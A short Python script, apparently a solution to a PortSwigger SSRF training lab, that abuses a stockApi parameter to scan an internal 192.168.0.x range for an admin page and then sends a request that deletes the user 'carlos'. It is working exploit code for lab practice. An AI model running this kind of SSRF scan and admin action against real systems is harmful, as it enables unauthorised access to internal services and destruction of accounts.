"""
Coded By : dedoxd2
Port swigger SSRF lab 2 
Broutforcing the PATH for the admin apge 
the deleting user 
"""
import requests
import sys
import urllib3
import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies =  {"http" :"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"
            }
path_for_admin_page = "ay Haga"
payload_for_deleting_user = "/delete?username=carlos"




def check_for_admin_page(path):


    print("(+) Bruteforcing the PATH for Admin page ...")
    abs_url = path + "/product/stock"

    for x in range(256):
        params = {
            "stockApi": f"http://192.168.0.{x}:8080/admin"
        }
        r = requests.post(abs_url , data=params , verify=False, proxies=proxies)        
        
        
        if r.status_code == 200:
            print("(+) We Have Got the Path for the Admin Page ...")
            print("(+) NOICE")
            print(f"(+) Path For Admin Page is {params['stockApi']}")
            
            global path_for_admin_page
            path_for_admin_page = params['stockApi']
            break

            
    

def delete_user(path,payload):

    print("(+) Deleting Carlos User ...")
    abs_url =  path + "/product/stock"
    params = {
        "stockApi" : path_for_admin_page + payload
    }
    r = requests.post(abs_url, data=params , verify=False,  proxies=proxies)
    
    print("(+) User Have been deleted Successfully ...")




def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        sys.argv[0]
        sys.exit(-1)
    
    
    url = sys.argv[1]
    print(f"(+) Module Starts date: {datetime.datetime.now()} ...")

    check_for_admin_page(url)
    delete_user(url ,payload_for_deleting_user )


if __name__ == "__main__":
    main()